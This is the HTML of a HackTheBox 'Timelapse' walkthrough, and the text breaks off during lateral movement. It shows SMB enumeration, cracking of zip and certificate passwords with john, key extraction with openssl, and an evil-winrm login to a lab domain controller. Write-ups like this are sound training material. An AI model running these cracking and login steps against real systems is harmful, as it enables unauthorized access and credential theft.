@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Timelapse - Saad Akhtar</title><meta name="Description" content="HackTheBox easy machine Timelapse walkthrough &amp; tutorial.."><meta property="og:title" content="HackTheBox - Timelapse" />
+<meta property="og:description" content="HackTheBox easy machine Timelapse walkthrough &amp; tutorial.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-timelapse/" /><meta property="og:image" content="/hackthebox-timelapse/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-20T20:00:21+05:00" />
+<meta property="article:modified_time" content="2022-08-20T20:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-timelapse/0.png"/>
+<meta name="twitter:title" content="HackTheBox - Timelapse"/>
+<meta name="twitter:description" content="HackTheBox easy machine Timelapse walkthrough &amp; tutorial.."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-timelapse/" /><link rel="prev" href="/pwnable.kr-toddlers-bottle-coin1/" /><link rel="next" href="/hackthebox-opensource/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Timelapse",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-timelapse\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-timelapse\/0.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1448 ,
+        "url": "\/hackthebox-timelapse\/","datePublished": "2022-08-20T20:00:21+05:00","dateModified": "2022-08-20T20:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox easy machine Timelapse walkthrough \u0026 tutorial.."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Timelapse</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-20">2022-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1448 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-timelapse/0.png"
+        data-srcset="/hackthebox-timelapse/0.png, /hackthebox-timelapse/0.png 1.5x, /hackthebox-timelapse/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-timelapse/0.png"
+        title="HackTheBox easy machine Timelapse walkthrough &amp; tutorial.." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#lateral-movement">Lateral Movement</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy Machine Timelapse from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv -Pn 10.10.11.152 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE       REASON  VERSION
+</span></span><span class="line"><span class="cl">53/tcp  open  domain        syn-ack Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp  open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span class="o">(</span>server time: 2022-08-18 16:40:28Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds? syn-ack
+</span></span><span class="line"><span class="cl">464/tcp open  kpasswd5?     syn-ack
+</span></span><span class="line"><span class="cl">593/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp open  ldapssl?      syn-ack
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 8h00m03s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 64147/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 32357/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 16288/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 22941/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-08-18T16:40:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerating <code>smb</code> we found some shares listed.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient -L 10.10.11.152                               
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>aad<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share 
+</span></span><span class="line"><span class="cl">        Shares          Disk      
+</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at the <code>Shares</code> share we have two directories <code>Dev</code> and <code>HelpDesk</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient <span class="se">\\\\</span>10.10.11.152<span class="se">\\</span>Shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>aad<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 11:39:15 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 11:39:15 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  Dev                                 D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 15:40:06 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  HelpDesk                            D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 11:48:42 <span class="m">2021</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>HelpDesk</code> directory has some files related to <code>LAPS</code>. But nothing seems useful for now.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smb: <span class="se">\H</span>elpDesk<span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 11:48:42 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 11:48:42 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  LAPS.x64.msi                        A  <span class="m">1118208</span>  Mon Oct <span class="m">25</span> 10:57:50 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  LAPS_Datasheet.docx                 A   <span class="m">104422</span>  Mon Oct <span class="m">25</span> 10:57:46 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  LAPS_OperationsGuide.docx           A   <span class="m">641378</span>  Mon Oct <span class="m">25</span> 10:57:40 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  LAPS_TechnicalSpecification.docx      A    <span class="m">72683</span>  Mon Oct <span class="m">25</span> 10:57:44 <span class="m">2021</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>Dev</code> directory has a file <code>winrm_backup.zip</code> which we can analyze.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 15:40:06 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Oct <span class="m">25</span> 15:40:06 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">  winrm_backup.zip                    A     <span class="m">2611</span>  Mon Oct <span class="m">25</span> 11:46:42 <span class="m">2021</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold">Foothold</h2>
+<p>The <code>zip</code> file is password protected which we can crack using <code>john</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ zip2john winrm_backup.zip &gt; john.hash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/home/saad/Documents/wordlists/rockyou.txt john.hash                 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">supremelegacy    <span class="o">(</span>winrm_backup.zip/legacyy_dev_auth.pfx<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2022-08-18 04:50<span class="o">)</span> 0.6535g/s 2267Kp/s 2267Kc/s 2267KC/s surkerior..suppamas
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Extracting the <code>zip</code> we get a <code>legacyy_dev_auth.pfx</code> file.</p>
+<p>Looking for the <code>.pfx</code> files.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>.pfx files<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank" rel="noopener noreffer ">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p>
+<p>Before extracting the certificate, we need to crack the password of <code>.pfx</code> file. We&rsquo;ll do this using <code>john</code> as well.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ pfx2john legacyy_dev_auth.pfx &gt; pfx.hash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/home/saad/Documents/wordlists/rockyou.txt pfx.hash 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>pfx, <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">[</span>PKCS#12 PBE <span class="o">(</span>SHA1/SHA2<span class="o">)</span> 256/256 AVX2 8x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">2000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>mac-type <span class="o">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512<span class="o">])</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">thuglegacy       <span class="o">(</span>legacyy_dev_auth.pfx<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:04:12 DONE <span class="o">(</span>2022-08-18 05:08<span class="o">)</span> 0.003963g/s 12808p/s 12808c/s 12808C/s thuglife06..thug211                                                    
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                                                            
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we&rsquo;ll follow the instructions <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank" rel="noopener noreffer ">here</a> to extract the certificate and private key from the <code>.pfx</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
+</span></span><span class="line"><span class="cl">Enter Import Password:thuglegacy
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key
+</span></span><span class="line"><span class="cl">Enter Import Password:thuglegacy
+</span></span><span class="line"><span class="cl">Enter PEM pass phrase:thuglegacy
+</span></span><span class="line"><span class="cl">Verifying - Enter PEM pass phrase:thuglegacy
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="usertxt">user.txt</h2>
+<p>Now we&rsquo;ll use <code>evil-winrm</code> to login with the <code>certificate</code> and <code>key</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.152 -c legacyy.crt -k legacyy.key -S
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter PEM pass phrase:thuglegacy
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami
+</span></span><span class="line"><span class="cl">timelapse\legacyy
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd ../Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; cat user.txt
+</span></span><span class="line"><span class="cl">a******************************8
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement</h2>
+<p>Analyzing the <code>winPEAS</code> output we found something interesting.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Windows Files Files (limit 70)
+</span></span><span class="line"><span class="cl">    C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span><span class="line"><span class="cl">    C:\Users\Default\NTUSER.DAT
